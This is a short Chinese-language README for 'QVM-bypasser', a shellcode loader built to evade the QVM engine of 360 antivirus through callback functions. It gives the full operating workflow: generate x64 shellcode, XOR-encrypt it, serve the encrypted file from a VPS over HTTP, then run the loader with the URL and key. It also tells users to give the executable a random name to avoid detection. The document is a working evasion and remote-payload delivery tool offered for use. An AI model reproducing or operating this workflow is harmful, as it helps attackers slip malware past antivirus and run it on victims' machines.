# QVM-bypasser

使用简单的回调函数bypassQVM引擎查杀



## 使用方法

1、生成x64位的shellcode

![image-20231202143904504](images\1.png)

2、使用xor.exe进行异或

```
Usage: xor.exe <input_filename> <output_filename> <key>
```



![image-20231202144301920](images\2.png)

3、将生成的 enc.bin 文件上传到 VPS ，开启 HTTP 服务

```
python -m http.server 80
```

![image-20231202144526524](images\3.png)

4、执行加载

使用之前最好将文件名改一下，改成随机的

```
Usage: QVM-bypasser.exe <url> <xor_key>
```

![image-20231202144716758](images\4.png)

![image-20231202144833469](images\5.png)



## 截图

![image-20231202150806484](images\6.png)